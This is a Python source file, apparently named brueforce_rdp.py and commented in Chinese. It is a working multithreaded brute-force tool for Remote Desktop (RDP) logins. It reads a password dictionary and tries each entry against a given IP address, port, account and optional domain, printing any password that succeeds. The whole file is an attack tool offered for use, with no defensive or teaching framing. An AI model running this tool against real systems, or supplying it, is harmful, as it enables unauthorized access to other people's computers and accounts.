#coding:utf-8

import rdpcheckmodel
import sys
import threading
import time
from colorama import Fore
import os
model_path=os.getcwd()
sys.path.append(model_path)


maxConnections = 5
snp = threading.Semaphore(value=maxConnections)

Flag = False
count = 0
Find = False
def rdp_login(ipaddr,dport,username,password,domain):

    global Flag,count,Find
    GREEN = Fore.GREEN  # 找到后的密码以绿色标亮
    RESET = Fore.RESET
    try:
        Flag = rdpcheckmodel.check_rdp(ipaddr,dport,username,password,domain)
        count += 1
        if Flag:
            #print(f'rdp_login {Flag}')
            print(f'{GREEN}[+] {ipaddr} login secessful! password is >>>{password}<<<{RESET}')
            Find = True
        else:
            #print(f'rdp_login {Flag}')
            print(f'[-] testing {password} is error,login failed，try {count}')

    except Exception as e:
        print(f'异常：{e}')
        print(f'有异常的密码:{password}')
        print('threading sleep 60s')
        time.sleep(60)
        rdp_login(ipaddr,dport,username,password,domain)
    snp.release()

#rdp_login('192.168.89.131',3389,'user1','P@ssw0rd','feel.com')

def main():
    if len(sys.argv) < 4 or len(sys.argv) > 7:
        print("""
        用法：python <脚本名> <ip地址> <端口号> <帐号名> <密码文件字典> [域名]
        注意:如果没有域，就不填
        例子：
        python brueforce_rdp.py 192.168.1.2 3389 administrator password.txt feel.com
        """)
        sys.exit(0)
    """
    ip=sys.argv[1]
    port=sys.argv[2]
    account=sys.argv[3]
    passwordfile=sys.argv[4]
    domains=sys.argv[5]
    print(ip,port,account,passwordfile,domains)
    """
    if len(sys.argv) == 6:
        domains = sys.argv[5]
    else:
        domains = ''
    passwordfile = sys.argv[4]
    with open(passwordfile,mode='rt',encoding='utf-8-sig') as password_f:
        for password_line in password_f:
            if Find:
                #print(f'main {Flag}')
                print(f'{sys.argv[1]} password is find ')
                print(f'一共测试了{count}次')
                sys.exit(0)
            passwd = password_line.strip()
            print(f"##{passwd}")

            #print(passwd)
            snp.acquire()
            #t = threading.Thread(target=rdp_login,args=(sys.argv[1],int(sys.argv[2]),sys.argv[3],passwd,sys.argv[5]))
            t = threading.Thread(target=rdp_login,
                                 args=(sys.argv[1],int(sys.argv[2]),sys.argv[3],passwd,domains))
            t.start()
            #rdp_login(sys.argv[1],int(sys.argv[2]),sys.argv[3],passwd,sys.argv[5])


if __name__=='__main__':
    main()
